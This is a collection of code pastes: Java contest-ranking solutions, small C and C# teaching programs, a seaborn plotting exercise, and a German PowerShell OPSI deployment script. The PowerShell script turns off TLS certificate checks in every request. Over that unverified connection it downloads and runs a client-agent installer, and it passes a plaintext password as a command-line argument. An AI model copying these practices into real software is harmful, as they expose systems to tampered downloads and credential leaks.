      individualStatistic.put(username, individualStatistic.get(username) + (points - currentPoints));
    }
  } else {
    // Otherwise, add the participant with their points
    contestParticipants.put(username, points);
    // Update the total score by adding the points
    individualStatistic.put(username, individualStatistic.getOrDefault(username, 0) + points);
  }
  
  input=scan.nextLine();
}

// For each contest in the map, print its name and number of participants
contentUserPointsMap.forEach((contestName, contestParticipants) -> {
  System.out.printf(""%s: %d participants%n"",contestName,contestParticipants.size());
  
  // Sort the participants by points in descending order and by order of input in ascending order
  List<String> sortedParticipants = new ArrayList<>(contestParticipants.keySet());
  sortedParticipants.sort((a, b) -> {
    int pointsA = contestParticipants.get(a);
    int pointsB = contestParticipants.get(b);
    if (pointsA != pointsB) {
      return Integer.compare(pointsB, pointsA); // descending order of points
    } else {
      return Integer.compare(orderOfInput.indexOf(a), orderOfInput.indexOf(b)); // ascending order of input
    }
  });
  
  AtomicInteger num = new AtomicInteger();
  
  // Print the position, username and points of each participant
  sortedParticipants.forEach(username -> System.out.printf(""%d. %s <::> %d%n"", num.incrementAndGet(), username,
          contestParticipants.get(username)));
});

System.out.println(""Individual standings:"");

// Sort the participants by total points in descending order and by order of input in ascending order
List<Map.Entry<String , Integer>> sortedIndividualStatistics = new ArrayList<>(individualStatistic.entrySet());
sortedIndividualStatistics.sort((a,b) -> {
    if (a.getValue() != b.getValue()) {
        return Integer.compare(b.getValue(), a.getValue()); // descending order of total points
    } else {
        return Integer.compare(orderOfInput.indexOf(a.getKey()), orderOfInput.indexOf(b.getKey())); // ascending order of input
    }
});

AtomicInteger num = new AtomicInteger();

// Print the position, username and total points of each participant
sortedIndividualStatistics.forEach(entry -> System.out.printf(""%d. %s -> %d%n"", num.incrementAndGet(), entry.getKey(),
        entry.getValue()));
  }
}
"
CvwPPtLG,Untitled,dllbridge,C,Sunday 2nd of July 2023 08:06:42 AM CDT,"
#include   <stdio.h>


char sz1[10] =  ""January"";
char sz2[10] = ""February"";


char *pszMonths[14];


////////////////////////////////////////////////////
int main()                                        // 
{
	
    char sz3[10] =    ""March"";
    char sz4[10] =    ""April"";
    
	pszMonths[1] = sz1;
    pszMonths[2] = sz2;
    pszMonths[3] = sz3;
    pszMonths[4] = sz4;
    
    printf(""Address of  %9s = %d\n"", pszMonths[1], pszMonths[1]);
    printf(""Address of  %9s = %d\n"", pszMonths[2], pszMonths[2]);
    printf(""Address of  %9s = %d\n"", pszMonths[3], pszMonths[3]);
    printf(""Address of  %9s = %d\n"", pszMonths[4], pszMonths[4]);    
}



"
JFzJJx2z,JudgeProblem,CR7CR7,Java,Sunday 2nd of July 2023 08:06:19 AM CDT,"import java.util.*;
public class Main {
    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);

    // A map to store the contests and their participants with points
    Map<String, Map<String, Integer>> contests = new LinkedHashMap<>();
    // A map to store the participants and their total points
    Map<String, Integer> participants = new HashMap<>();

    String input = scanner.nextLine();
    while (!input.equals(""no more time"")) {
        // Split the input by "" -> "" to get the username, contest name and points
        String[] tokens = input.split("" -> "");
        String username = tokens[0];
        String contestName = tokens[1];
        int points = Integer.parseInt(tokens[2]);

        // If the contest is not in the map, add it with an empty map as value
        contests.putIfAbsent(contestName, new HashMap<>());
        // Get the map of participants for this contest
        Map<String, Integer> contestParticipants = contests.get(contestName);

        // If the participant is already in the map, update their points if they are higher
        if (contestParticipants.containsKey(username)) {
            int currentPoints = contestParticipants.get(username);
            if (points > currentPoints) {
                // Update the contest score
                contestParticipants.put(username, points);
                // Update the total score by adding the difference
                participants.put(username, participants.get(username) + (points - currentPoints));
            }
        } else {
            // Otherwise, add the participant with their points
            contestParticipants.put(username, points);
            // Update the total score by adding the points
            participants.put(username, participants.getOrDefault(username, 0) + points);
        }

        input = scanner.nextLine();
    }

    // For each contest in the map, print its name and number of participants
    contests.forEach((contestName, contestParticipants) -> {
        System.out.println(contestName + "": "" + contestParticipants.size() + "" participants"");
        // Sort the participants by points in descending order and by username in ascending order
        List<String> sortedParticipants = new ArrayList<>(contestParticipants.keySet());
        sortedParticipants.sort((a, b) -> {
            int pointsA = contestParticipants.get(a);
            int pointsB = contestParticipants.get(b);
            if (pointsA != pointsB) {
                return Integer.compare(pointsB, pointsA); // descending order of points
            } else {
                return a.compareTo(b); // ascending order of usernames
            }
        });
        // Print the position, username and points of each participant
        for (int i = 0; i < sortedParticipants.size(); i++) {
            String username = sortedParticipants.get(i);
            int points = contestParticipants.get(username);
            System.out.println((i + 1) + "". "" + username + "" <::> "" + points);
        }
    });

    System.out.println(""Individual standings:"");
    // Sort the participants by total points in descending order and by username in ascending order
    List<Map.Entry<String, Integer>> sortedParticipants = new ArrayList<>(participants.entrySet());
    sortedParticipants.sort((a, b) -> {
        if (a.getValue() != b.getValue()) {
            return Integer.compare(b.getValue(), a.getValue()); // descending order of total points
        } else {
            return a.getKey().compareTo(b.getKey()); // ascending order of usernames
        }
    });
    // Print the position, username and total points of each participant
    for (int i = 0; i < sortedParticipants.size(); i++) {
        String username = sortedParticipants.get(i).getKey();
        int totalPoints = sortedParticipants.get(i).getValue();
        System.out.println((i + 1) + "". "" + username + "" -> "" + totalPoints);
    }

    scanner.close();
}
}"
pU3tpXpQ,Judge,CR7CR7,Java,Sunday 2nd of July 2023 08:03:48 AM CDT,"import java.util.LinkedHashMap;
import java.util.Map;
import java.util.Scanner;
import java.util.concurrent.atomic.AtomicInteger;

public class Judge {
    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);

        String input = scanner.nextLine();

        Map<String, Map<String, Integer>> storedValues = new LinkedHashMap<>();

        while (!input.equals(""no more time"")) {
            String[] array = input.split("" -> "");
            String username = array[0];
            String contest = array[1];
            int points = Integer.parseInt(array[2]);

            if (!storedValues.containsKey(contest)) {
                storedValues.put(contest, new LinkedHashMap<>());
                storedValues.get(contest).put(username, points);
            } else {
                if (storedValues.get(contest).containsKey(username)) {
                    if (points > storedValues.get(contest).get(username)) {
                        storedValues.get(contest).put(username, points);
                    }
                } else {
                    storedValues.get(contest).put(username, points);
                }
            }

            input = scanner.nextLine();
        }


        AtomicInteger num = new AtomicInteger();
        storedValues.forEach((k, v) -> {
            num.set(0);
            System.out.printf(""%s: %d participants%n"", k, v.size());
            v.entrySet().stream().sorted(Map.Entry.<String, Integer>comparingByValue().reversed()
                    .thenComparing(Map.Entry.comparingByKey()))
                    .forEach(e -> System.out.printf(""%d. %s <::> %d%n"", num.incrementAndGet(), e.getKey(), e.getValue()));
        });

        System.out.println(""Individual standings:"");

        Map<String, Integer> results = new LinkedHashMap<>();

        for (Map.Entry<String, Map<String, Integer>> entry : storedValues.entrySet()) {
            for (Map.Entry<String, Integer> mapEntry : entry.getValue().entrySet()) {
                results.putIfAbsent(mapEntry.getKey(), 0);
                results.put(mapEntry.getKey(), results.get(mapEntry.getKey()) + mapEntry.getValue());
            }
        }

        num.set(0);
        results.entrySet().stream().sorted(Map.Entry.<String, Integer>comparingByValue().reversed()
                .thenComparing(Map.Entry.comparingByKey()))
                .forEach(e -> System.out.printf(""%d. %s -> %d%n"", num.incrementAndGet(), e.getKey(), e.getValue()));
    }
}"
caiN3mja,"Kaggle - Exercise 4 - Scatterplot, regplot, lmplot, swarmplot",makispaiktis,Python,Sunday 2nd of July 2023 07:21:31 AM CDT,"import pandas as pd
pd.plotting.register_matplotlib_converters()
import matplotlib.pyplot as plt
# %matplotlib inline
import seaborn as sns


# 1. Read the dataset
candy_filepath = ""../input/candy.csv""
candy_data = pd.read_csv(candy_filepath, index_col=""id"")
print(candy_data.head())

# Which candy was more popular with survey respondents: '3 Musketeers' or 'Almond Joy'? 
more_popular = '3 Musketeers'
# Which candy has higher sugar content: 'Air Heads' or 'Baby Ruth'?
more_sugar = 'Air Heads'

# 2. Sugar vs Win ----> Scatter and regression line plot
sns.scatterplot(x=candy_data['sugarpercent'], y=candy_data['winpercent'])
sns.regplot(x=candy_data['sugarpercent'], y=candy_data['winpercent'])

# 3. Sugar vs Win vs Chocolate ----> Scatter and regression line plot (lmplot)
sns.scatterplot(x=candy_data['pricepercent'], y=candy_data['winpercent'], hue=candy_data['chocolate'])
sns.lmplot(data=candy_data, x=""pricepercent"", y=""winpercent"", hue=""chocolate"")

# 4. Chocolate vs Win
sns.swarmplot(x=candy_data[""chocolate""], y=candy_data[""winpercent""])"
fBGatKFW,Basic C# Program,iumar69,C#,Sunday 2nd of July 2023 07:15:14 AM CDT,"using System;
using System.Net;

namespace A
{
    class Myclass
    {
        static void Main()
        {
            //string name = Console.ReadLine();
            //if (name == ""Umar"")
            //{
            //    Console.WriteLine(""Hi, "" + name);
            //}
            //else
            //{
            //    Console.WriteLine(""Byy, {0}"", name);
            //}

            //Console.WriteLine(""Enter the day Number"");
            //int dayno = int.Parse(Console.ReadLine());
            //if (dayno == 1)  { Console.WriteLine(""This is Sunday"");}
            //else if(dayno == 2) { Console.WriteLine(""This is Monday""); }
            //else if (dayno == 3) { Console.WriteLine(""This is tuesday""); }
            //else if (dayno == 4) { Console.WriteLine(""This is Wednesday""); }
            //else if (dayno == 5) { Console.WriteLine(""This is thursday""); }
            //else if(dayno == 6) { Console.WriteLine(""This is friday""); }
            //else if( dayno == 7) { Console.WriteLine(""This is saturday""); }

            //Console.WriteLine(""Enter the month Number"");
            //int monthno = int.Parse(Console.ReadLine());

            //switch(monthno)
            //{
            //    case 1: Console.WriteLine(""This is Jan"");break;
            //    case 2: Console.WriteLine(""This is Feb"");break;
            //    case 3: Console.WriteLine(""This is March"");break;
            //    case 4: Console.WriteLine(""This is April"");break;
            //    case 5: Console.WriteLine(""This is May"");break;
            //    case 6: Console.WriteLine(""This is June"");break;
            //    case 7: Console.WriteLine(""This is July"");break;
            //    case 8: Console.WriteLine(""This is August"");break;
            //    case 9: Console.WriteLine(""This is September"");break;
            //    case 10: Console.WriteLine(""This is Oct"");break;
            //    case 11: Console.WriteLine(""This is Nov"");break;
            //    case 12: Console.WriteLine(""This is Dec"");break;
            //    default: Console.WriteLine(""This is not a valid Month. Please try again!"");break;
            //}

            //int[] arr = new int[5];
            //int index = 0;
            //foreach (int element in arr)
            //{
            //    Console.WriteLine(element);
            //    int value = int.Parse(Console.ReadLine());
            //    arr[index] = value;

            //}

            //foreach (int element in arr)
            //{
            //    Console.WriteLine(element);
            //}
            //Console.ReadLine();

            //    int[,] arr = new int[2, 2];

            //    arr[0,0] = 1; 
            //    arr[1,0] = 2;
            //    arr[0,1] = 3;
            //    arr[1,1] = 4;

            //    for(int i = 0; i < 2; i++)
            //    {
            //        for(int j = 0; j < 2; j++)
            //        {
            //            Console.Write(""{0} "", arr[i,j]);

            //        }
            //        Console.WriteLine();
            //    }
            //    Console.ReadLine();
            //}

            //int[,] first = {
            //                { 1, 2 },
            //                { 3, 4 },

            //            };
            //int[,] second = {
            //                { 1, 22 },
            //                { 33, 44},
            //            };

            //int[,] third = new int[2, 2];

            //for (int i = 0; i < 2; i++)
            //{
            //    for (int j = 0; j < 2; j++)
            //    {
            //        third[i, j] = first[i, j] + second[i, j];
            //    }

            //}
            //Console.WriteLine(first.GetLength(0));
            //Console.WriteLine(first.GetLength(1));

            //for (int i = 0; i < 2; i++)
            //{
            //    for (int j = 0; j < 2; j++)
            //    {
            //        Console.Write(""{0} "", third[i, j]);
            //    }
            //    Console.WriteLine();
            //}
            //Console.ReadLine();

            //int[][] arr = new int[2][];

            //arr[0] = new int[] { 1, 2, 3, 4, 5 };
            //arr[1] = new int[] { 6, 7, 8, 9, 10 };

            //for (int i = 0; i < arr.Length; i++)
            //{
            //    for (int j = 0; j < arr[i].Length; j++)
            //    {
            //        Console.Write(arr[i][j]);
            //    }
            //    Console.WriteLine();

            //}
            //Console.ReadLine();

            //    for(int i=0;i< 10;i++)
            //    {
            //        Console.WriteLine(i + "" th time we have moved"");

            //        if (i == 5) { goto myflag; }
            //    }

            //myflag:
            //    Console.WriteLine(""We have exited the loop now"");


            //    Console.ReadLine();
            int[,] arr1 = new int[2, 2];
            int[,] arr2 = new int[2, 2];
            int[,] arr3 = new int[2, 2];
            Console.WriteLine(""Enter elements of array 1"");
            for (int i = 0; i < 2; i++)
            {
                for (int j = 0; j < 2; j++)
                {
                    arr1[i, j] = int.Parse(Console.ReadLine());
                }
            }
            for (int i = 0; i < 2; i++)
            {
                for (int j = 0; j < 2; j++)
                {
                    Console.Write(arr1[i, j]); Console.Write("" "");
                }
                Console.WriteLine();
            }
            Console.ReadLine();
        }

    }
}"
vAW1Bh5k,Inheritence,iumar69,C#,Sunday 2nd of July 2023 07:14:23 AM CDT,"
----------------------------------------------This is the program of inheritence----------------------------------------
using System;
using System.Net;
using System.Runtime.Remoting.Metadata.W3cXsd2001;
using System.Windows.Markup;

class Vehicle
{
    int id = 1;
    string name = ""car"";


    public void setDetails(int val, string namee)
    {
        id = val;
        name = namee;
    }

    public void display()
    {
        Console.WriteLine(""These are id and name: {0} and {1}"", id, name);
    }

    public void testfunction()
    {
        Console.WriteLine(""This is the function of Vehicle Class"");
    }

}

class Car : Vehicle
{
    public void CarDisplay()
    {
        Console.WriteLine(""This is the function of car Class"");
    }

}

class Jeep : Car
{
    public void DisplayJeep()
    {
        Console.WriteLine(""This is the function of Jeep Class"");
    }
}


class Program
{
    public static void Main()
    {
        Jeep jeep = new Jeep();
        jeep.testfunction();
        jeep.CarDisplay();
        jeep.DisplayJeep();

        Console.ReadLine();

    }
}"
nzSgA13c,OPSI PS Integration,Farliam,PowerShell,Sunday 2nd of July 2023 07:13:59 AM CDT,"<#
.SYNOPSIS
    OPSI PS Integration

.DESCRIPTION
    Automatisches installieren des Client Agents
    und Programme anhand vorhandener Clients
.NOTES
    Filename: Auto_Opsi.ps1
    Author: Matthias W.
    Modified date: 02.07.2023
    Version 1.1
#>

$Global:OPSIWebSession = [Microsoft.PowerShell.Commands.WebRequestSession]::new()
$Global:EndPoint = ""192.168.2.102:4447""

#region OPSI Session

function New-OPSISession {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$User,
        [Parameter(Mandatory = $true)]
        [string]$Passwort,
        [Parameter(Mandatory = $true)]
        [string]$Endpoint        
    )

    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
    
    $headers = New-Object ""System.Collections.Generic.Dictionary[[String],[String]]""
    $headers.Add(""x-opsi-session-lifetime"", ""900"")
    $headers.Add(""Content-Type"", ""application/json"")

    
    $body = ""{`""username`"":`""$User`"",`""password`"":`""$Passwort`""}""
    
    try {
        $response = Invoke-WebRequest ""https://$Endpoint/session/login"" -Method 'POST' -Headers $headers -Body $body -WebSession $Global:OPSIWebSession
        return ConvertFrom-Json $response.Content
    }
    catch {
        Write-Host $_
        if ($_.Exception.Response.StatusCode -eq 401) {
            Write-Host ""Fehler beim Login"" -ForegroundColor Red
            return $null
        }
        else {
            write-Host ""Loginfehler: ""$_.Exception.Response.StatusCode -ForegroundColor Red
            return $null
        }
    }

}
function Close-OPSISession {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [Microsoft.PowerShell.Commands.WebRequestSession]$Session,
        [Parameter(Mandatory = $true)]
        [string]$Endpoint     
    )
    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
    
    try {
        $response = Invoke-WebRequest ""https://$Endpoint/session/logout"" -Method 'POST'-WebSession $Session -Body """"
        return  ConvertFrom-Json $response.Content
    }
    catch {
        Write-Host $_ -ForegroundColor Red
        return $false
    }
}

#endregion

#region RestAPI
function Invoke-RawRequest {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [Microsoft.PowerShell.Commands.WebRequestSession]$Session,
        [Parameter(Mandatory=$true)]
        [string]$Endpoint,     
        [Parameter(Mandatory=$true)]
        [string]$Content     
    )
    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
    try {
        $headers = New-Object ""System.Collections.Generic.Dictionary[[String],[String]]""
        $headers.Add(""Content-Type"", ""application/json"")
        $headers.Add(""X-Requested-With"", ""XMLHttpRequest"")
        $Body =  $Content
        $response = Invoke-WebRequest ""https://$Endpoint/rpc"" -Method 'POST' -Headers $headers -Body $Body  -WebSession $Session
        return ConvertFrom-Json $response.Content
    }
    catch {
        Write-Host ""Invoke-RawRequest Error : "" $Content ""`n$_""
        return $null
    }
}
function Get-ClientIDs {
    param(
        [Parameter(Mandatory = $true)]
        [Microsoft.PowerShell.Commands.WebRequestSession]$Session,
        [Parameter(Mandatory = $true)]
        [string]$Endpoint     
    )
    $Content = ConvertTo-Json @{
        'id'      = '1'
        'jsonrpc' = '2.0'
        'method'  = 'getClientIds_list'
        'params'  = @{}
    }
    return Invoke-RawRequest -Session $Session -Endpoint $Endpoint -Content $Content
}
function Get-ProductIds {
    param(
        [Parameter(Mandatory = $true)]
        [Microsoft.PowerShell.Commands.WebRequestSession]$Session,
        [Parameter(Mandatory = $true)]
        [string]$Endpoint     
    )
    $Content = ConvertTo-Json @{
        'id'      = '1'
        'jsonrpc' = '2.0'
        'method'  = 'getProductIds_list'
        'params'  = @{}
    }
    return Invoke-RawRequest -Session $Session -Endpoint $Endpoint -Content $Content
}
function Get-InstalledProducts {
    param(
        [Parameter(Mandatory = $true)]
        [Microsoft.PowerShell.Commands.WebRequestSession]$Session,
        [Parameter(Mandatory = $true)]
        [string]$Endpoint,
        [Parameter(Mandatory = $true)]
        [string]$Client        
    )
    $Content = ConvertTo-Json @{
        'id'      = '1'
        'jsonrpc' = '2.0'
        'method'  = 'getInstalledLocalBootProductIds_list'
        'params'  = @($Client)
    }
    return Invoke-RawRequest -Session $Session -Endpoint $Endpoint -Content $Content
}
function Confirm-ProductStatus {
    param(
        [Parameter(Mandatory = $true)]
        [Microsoft.PowerShell.Commands.WebRequestSession]$Session,
        [Parameter(Mandatory = $true)]
        [string]$Endpoint,
        [Parameter(Mandatory = $true)]
        [string]$Client,
        [Parameter(Mandatory = $true)]
        [string]$Product,
        [Parameter(Mandatory = $true)]
        [ValidateSet(""none"", ""setup"", ""update"", ""uninstall"")]
        [string]$ProduktAktion         
    )
    $Content = ConvertTo-Json @{
        'id'      = '1'
        'jsonrpc' = '2.0'
        'method'  = 'setProductActionRequest'
        'params'  = @($Product, $Client, $ProduktAktion)
    }
    return Invoke-RawRequest -Session $Session -Endpoint $Endpoint -Content $Content
}
function Confirm-HostFireEvent {
    param(
        [Parameter(Mandatory = $true)]
        [Microsoft.PowerShell.Commands.WebRequestSession]$Session,
        [Parameter(Mandatory = $true)]
        [string]$Endpoint,
        [Parameter(Mandatory = $true)]
        [string]$Client
    ) 
    $Content = ConvertTo-Json @{
        'id'      = '1'
        'jsonrpc' = '2.0'
        'method'  = 'hostControl_fireEvent'
        'params'  = @(""on_demand"", $Client)
    }
    return Invoke-RawRequest -Session $Session -Endpoint $Endpoint -Content $Content
}
#endregion

#region Toolset
function Select-Objects {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [PSCustomObject]$jsonResult     
    )
    Clear-Host
    Write-Host ""Bitte waehlen Sie die zu installierenden Programmen aus.""
    Write-Host ""Zum bestaetigen druecken Sie die ESC Tasten.`n"" 

    $tmpItems = New-Object System.Collections.Generic.Dictionary""[String,bool]""

    $originalPosition = $Host.UI.RawUI.CursorPosition
    $curY = 0

    foreach ($prop in $jsonResult.'result') {
        $tmpItems.Add($prop, [bool]::Parse('false'))
        Write-Host $prop.PadRight(50) (""False"").PadRight(10) (""[ ]"").PadRight(10)
    }


    [Console]::SetCursorPosition(0, 0)
    [Console]::CursorVisible = [bool]::Parse('false')

    while ($true) {
        $key = $host.UI.RawUI.ReadKey('IncludeKeyDown, NoEcho')

        if ($key.VirtualKeyCode -eq '87' -or $key.VirtualKeyCode -eq '38') {
            [Console]::SetCursorPosition(0, $originalPosition.Y + $curY)
            $keyName = $tmpItems.Keys | Select-Object -Index $curY
            Write-Host $keyName.PadRight(50) ($tmpItems[$keyName].ToString()).PadRight(10) (""[ ]"").PadRight(10) -ForegroundColor White -NoNewline
            if ($curY -eq 0) {
                $curY = $tmpItems.Count - 1
            }
            else {
                $curY -= 1
            }
            [Console]::SetCursorPosition(0, ($originalPosition.Y + $curY))
            $keyName = $tmpItems.Keys | Select-Object -Index $curY
            Write-Host $keyName.PadRight(50) ($tmpItems[$keyName].ToString()).PadRight(10) (""[*]"").PadRight(10) -ForegroundColor Green -NoNewline
        }
        elseif ($key.VirtualKeyCode -eq '40' -or $key.VirtualKeyCode -eq '83') {
            [Console]::SetCursorPosition(0, $originalPosition.Y + $curY)
            $keyName = $tmpItems.Keys | Select-Object -Index $curY
            Write-Host $keyName.PadRight(50) ($tmpItems[$keyName].ToString()).PadRight(10) (""[ ]"").PadRight(10) -ForegroundColor White -NoNewline
            if ($curY -eq $tmpItems.Count - 1) {
                $curY = 0
            }
            else {
                $curY += 1
            }
            [Console]::SetCursorPosition(0, ($originalPosition.Y + $curY))
            $keyName = $tmpItems.Keys | Select-Object -Index $curY
            Write-Host $keyName.PadRight(50) ($tmpItems[$keyName].ToString()).PadRight(10) (""[*]"").PadRight(10) -ForegroundColor Green -NoNewline
        }
        elseif ($key.VirtualKeyCode -eq '13') {
            [Console]::SetCursorPosition(0, ($originalPosition.Y + $curY))
            $keyName = $tmpItems.Keys | Select-Object -Index $curY
            $tmpItems[$keyName] = -not([bool]::Parse($tmpItems[$keyName]))
            Write-Host $keyName.PadRight(50) ($tmpItems[$keyName].ToString()).PadRight(10) (""[*]"").PadRight(10) -ForegroundColor Green -NoNewline
        }
        elseif ($key.VirtualKeyCode -eq '27') {
            Clear-Host
            break
        }
    }
    $bk = $tmpItems.GetEnumerator().Where({ $_.Value.ToString() -eq 'true' }) | ForEach-Object { $_.Key.ToString() }
    return $bk
}
function Enter-Client {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $true)]
        [PSCustomObject]$jsonResult     
    )
    $clients = New-Object System.Collections.Generic.Dictionary""[Int,String]""
    foreach ($prop in $jsonResult.'result') {
        $clients.Add($clients.Count, $prop)
    }
    while ($true) {
        Clear-Host
        $clients | Format-Table | Out-Host
        Write-Host ""Zum beenden geben Sie -1 ein.""
        $output = Read-Host -Prompt  ""Bitte geben Sie den Namen oder den Key ein""
        if ($output -eq ""-1"") { Exit 0 }
        if ($output -match ""^\d+$"") {
            #Key
            if ($clients.ContainsKey($output)) {
                return $clients.Item($output)
            }
        }
        else {
            #Name
            if ($clients.ContainsValue($output)) {
                return $output
            }
        }
    }
}
function Install-OPSI_ClientAgent{
    param(
        [Parameter(Mandatory=$true)]
        [string]$Username,
        [Parameter(Mandatory=$true)]
        [string]$Passwort,
        [Parameter(Mandatory=$true)]
        [string]$ClientName
    )
    try{
        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
        $Dest = (New-Object -ComObject Shell.Application).NameSpace('shell:Downloads').Self.Path + ""\oca.exe""
        $sc = ""https://"" + $Global:EndPoint  + ""/public/opsi-client-agent/opsi-client-agent-installer.exe""
        (New-Object System.Net.WebClient).DownloadFile($sc, $Dest)
        $params = "" --service-address "" + $Global:EndPoint + "" --service-username "" + $Username + "" --service-password ""  + $Passwort + "" --client-id "" + $ClientName + "" --no-gui""
        Start-Process -FilePath $Dest -ArgumentList $params -Wait
    }catch{
        Write-Host $_
    }
}
#endregion

#region Main
function Main {
    $username = """"
    $pass = """"
    while ($true) {
        Clear-Host
        Write-Host ""OPSI Powershell Connect 1.1`n"" -ForegroundColor Green
        $username = Read-Host -Prompt ""Bitte geben Sie Ihren Usernamen ein""
        $securePWd = Read-Host -Prompt ""Bitte geben Sie Ihr Passwort ein"" -AsSecureString
        $pass = [Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($securePwd))
        $response = New-OPSISession -User $username -Passwort $pass -Endpoint $Global:EndPoint
        if (-not($null -eq $response)) {
            Clear-Host
            Write-Host ""Erfolgreich verbunden!`nDruecke eine Taste..."" -ForegroundColor Green
            Read-Host
            break 
        }
        else {
            Clear-Host
            Write-Host ""Verbindung konnte nicht aufgebaut werden!`nDruecke eine Taste..."" -ForegroundColor Yellow
            $key = Get-ItemProperty -Path ""HKLM:\SOFTWARE\Microsoft\Internet Explorer\Main"" -Name ""DisableFirstRunCustomize"" -ErrorAction SilentlyContinue
            if($null -eq $key){
                #Ersteinrichtung skippen
                Write-Host """"
                Write-Host ""Die Ersteinrichtung vom Internetexplorer ist nicht abgeschlossen."" -ForegroundColor Yellow
                Write-Host ""Setze Registry Key um Einrichtung zu skippen"" -ForegroundColor Yellow
                Set-ItemProperty -Path ""HKLM:\SOFTWARE\Microsoft\Internet Explorer\Main"" -Name ""DisableFirstRunCustomize"" -Value 2
                Write-Host  ""Eintrag wurde gesetzt. Drücke Enter."" -ForegroundColor Green
                Read-Host
            }
            Read-Host
        }
    }

    while ($true) {
        Clear-Host
        Write-Host ""OPSI Powershell Connect 1.1`n"" -ForegroundColor Green
        Write-Host ""1. Hosts anzeigen.""
        Write-Host ""2. Produkte anzeigen.""
        Write-Host ""3. Produkt installieren.""
        Write-Host ""4. Produkte anhand Hosts installieren.""
        Write-Host ""5. Install OPSI-Client-Agent""
        Write-Host ""6. Close Session & Exit.`n""
        $Eingabe = Read-Host -Prompt ""Eingabe""
        switch ($Eingabe) {
            ""1"" {  
                $response = Get-ClientIDs -Session $Global:OPSIWebSession -Endpoint $Global:EndPoint
                if (-not($null -eq $response)) { 
                    Clear-Host
                    Write-Host ""Host IDs empfangen.`n"" -ForegroundColor Green 
                    $response.'result' | Format-Table -AutoSize
                    Read-Host -Prompt ""`nDruecke eine beliebige Taste""
                } else{Write-Host ERROR; Read-Host}         
            }
            ""2"" { 
                $response = Get-ProductIds -Session $Global:OPSIWebSession -Endpoint $Global:EndPoint
                if (-not($null -eq $response)) { 
                    Clear-Host
                    Write-Host ""Produkte empfangen.`n"" -ForegroundColor Green 
                    $response.'result' | Format-Table -AutoSize
                    Read-Host -Prompt ""`nDruecke eine beliebige Taste""
                }
            }
            ""3"" {  
                $response = Get-ClientIDs -Session $Global:OPSIWebSession -Endpoint $Global:EndPoint
                if (-not($null -eq $response)) { 
                    Clear-Host
                    Write-Host ""Host IDs empfangen.`n"" -ForegroundColor Green 
                    $response.'result' | Format-Table -AutoSize
                }else{break} 
                while($true){
                    $fqdn = Read-Host ""`nBitte geben Sie einen Host (FQDN) an""
                    if($response.'result' -contains $fqdn){
                        break
                    }
                } 
                Write-Host ""Rufe verfuegbare Produktinformationen ab...""
                $response = Get-ProductIds -Session $Global:OPSIWebSession -Endpoint $Global:EndPoint
                if (-not($null -eq $response)) { 
                    $ToInstall = Select-Objects -jsonResult $response
                } else{Write-Host ERROR; Read-Host;break}
                #Produkte die installiert werden sollen sind vorhanden
                #Vergleichen mit Produkten die bereits installiert sind
                $response = Get-InstalledProducts -Session $Global:OPSIWebSession -Endpoint $Global:EndPoint -Client $fqdn
                if ($null -eq $response) {Write-Host ERROR ;Read-Host;break} 
                foreach($prod in $ToInstall){
                    #Ist es installiert?
                    if($response.'result' -contains $prod){
                        Write-Host $prod ""ist installiert."" -ForegroundColor Green
                    }else{
                        Write-Host $prod ""wird installiert."" -ForegroundColor Magenta
                        Confirm-ProductStatus -Session $Global:OPSIWebSession -Endpoint $Global:EndPoint -Client $fqdn -Product $prod -ProduktAktion setup > $null
                    }
                }
                #OnDemand auslösen
                Confirm-HostFireEvent -Session $Global:OPSIWebSession -Endpoint $Global:EndPoint -Client $fqdn > $null
            }
            ""4"" {  
                $response = Get-ClientIDs -Session $Global:OPSIWebSession -Endpoint $Global:EndPoint
                if (-not($null -eq $response)) { 
                    Clear-Host
                    Write-Host ""Host IDs empfangen.`n"" -ForegroundColor Green 
                    $response.'result' | Format-Table -AutoSize
                }else{break} 
                while($true){
                    $Spiegel = Read-Host ""`nBitte geben Sie einen Host (FQDN) zum Spiegeln an""
                    if($response.'result' -contains $Spiegel){
                        break
                    }
                } 
                while($true){
                    $Dest = Read-Host ""`nBitte geben Sie den Zielhost (FQDN) an""
                    if($response.'result' -contains $Dest){
                        break
                    }
                } 
                $mirror = Get-InstalledProducts -Session $Global:OPSIWebSession -Endpoint $Global:EndPoint -Client $Spiegel
                if ($null -eq $response) {Write-Host ERROR ;Read-Host;break} 
                $mirrorDest = Get-InstalledProducts -Session $Global:OPSIWebSession -Endpoint $Global:EndPoint -Client $Dest
                if ($null -eq $response) {Write-Host ERROR ;Read-Host;break} 
                foreach($prod in $mirror.'result'){
                    #Ist es installiert?
                    if($mirrorDest.'result' -contains $prod){
                        Write-Host $prod ""ist installiert."" -ForegroundColor Green
                    }else{
                        Write-Host $prod ""wird installiert."" -ForegroundColor Magenta
                        Confirm-ProductStatus -Session $Global:OPSIWebSession -Endpoint $Global:EndPoint -Client $Dest -Product $prod -ProduktAktion setup > $null
                    }
                }
                #OnDemand auslösen
                Confirm-HostFireEvent -Session $Global:OPSIWebSession -Endpoint $Global:EndPoint -Client $Dest > $null
                Read-Host
            }
            ""5""{
                if((Read-Host -Prompt ""Auf diesem PC wird der OPSI Client Agent installiert? (j/n)"") -ccontains ""j""){
                    $response = Get-ClientIDs -Session $Global:OPSIWebSession -Endpoint $Global:EndPoint
                    if ($null -eq $response) { 
                        Write-Host ""Fehler beim empfagen bereits eingetragener Hosts"" -ForegroundColor Red
                    }
                    while($true){
                        $fqdn = Read-Host ""`nBitte geben Sie einen Host (FQDN) an""
                        if(-not($response.'result' -contains $fqdn)){
                            Write-Host ""Der FQDN "" $fqdn "" ist noch verfuegbar."" -ForegroundColor Green
                            break
                        }
                    }
                    Install-OPSI_ClientAgent -Username $username -Passwort $pass -ClientName $fqdn
                    Write-host ""Ende Installation""
                    Read-Host
                }
            }
            ""6"" {  
                Clear-Host
